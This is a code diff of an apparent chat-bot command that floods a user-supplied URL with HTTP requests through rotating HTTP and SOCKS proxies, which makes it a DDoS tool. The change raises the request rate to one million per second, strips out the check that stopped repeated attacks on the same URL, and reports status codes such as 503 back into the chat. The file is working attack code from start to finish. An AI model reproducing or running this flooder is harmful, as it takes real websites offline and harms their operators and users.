@@ -66,7 +66,7 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = Number.MAX_SAFE_INTEGER;
+const requestsPerSecond = 1000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -93,8 +93,6 @@ const loadProxies = () => {
     }
 };
 
-const activeAttacks = new Map();
-
 const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     if (!continueAttack) return;
 
@@ -118,11 +116,11 @@ const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
     .catch((err) => {
         if (err.response?.status === 503) {
-            console.error("Target under heavy load (503).");
+            chat.log("Target under heavy load (503).");
         } else if (err.response?.status === 502) {
-            console.error("Bad Gateway (502).");
+            chat.log("Bad Gateway (502).");
         } else if (err.response?.status === 403) return;
-        console.error("DDOS OTHER STATUS" + err.message);
+        chat.log("DDOS OTHER STATUS" + err.message);
         setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0);
     });
 };
@@ -138,22 +136,16 @@ module.exports["run"] = async ({
         return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
     }
 
-    if (activeAttacks.has(targetUrl)) {
-        return chat.reply(font.thin("An attack on this URL is already in progress. Wait for it to finish before starting another."));
-    }
-
     const proxies = loadProxies();
     if (!proxies.length) {
         return chat.reply(font.thin("No proxies found. Please add proxies to the proxy file."));
     }
 
     let continueAttack = true;
-    activeAttacks.set(targetUrl, true); 
     await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
     const attackTimeout = setTimeout(() => {
         continueAttack = false;
-        activeAttacks.delete(targetUrl);
         chat.reply(font.thin("Max flood requests Initiated. Attacking Website..."));
     }, (maxRequests / requestsPerSecond) * 1000);
 
@@ -161,17 +153,15 @@ module.exports["run"] = async ({
         const randomProxy = getRandomElement(proxies);
         const proxyParts = randomProxy.split(":");
 
-        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
 
         const agent = proxyProtocol === "socks5"
-            ? new SocksProxyAgent(proxyUrl)
-            : new HttpsProxyAgent(proxyUrl);
+        ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
 
         performAttack(targetUrl, agent, null, continueAttack, () => {
             if (!continueAttack) {
                 clearTimeout(attackTimeout);
-                activeAttacks.delete(targetUrl);
             }
         });
     }
